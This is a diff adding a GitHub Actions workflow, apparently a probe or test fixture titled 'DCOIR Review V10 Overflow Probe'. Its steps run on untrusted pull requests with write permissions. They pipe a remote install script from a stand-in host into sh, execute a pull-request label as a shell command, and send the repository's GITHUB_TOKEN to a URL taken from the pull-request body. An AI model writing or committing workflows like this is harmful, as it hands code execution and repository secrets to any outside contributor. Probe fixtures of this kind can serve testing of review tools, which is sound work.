@@ -1,0 +1,19 @@
+name: DCOIR Review V10 Overflow Probe
+on:
+  pull_request_target:
+permissions:
+  contents: write
+  actions: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Install unverified agent
+        run: wget -qO- https://downloads.example.invalid/install.sh | sh
+      - name: Execute pull request label
+        run: bash -lc "${{ github.event.pull_request.labels[0].name }}"
+      - name: Send token to pull request body URL
+        run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"
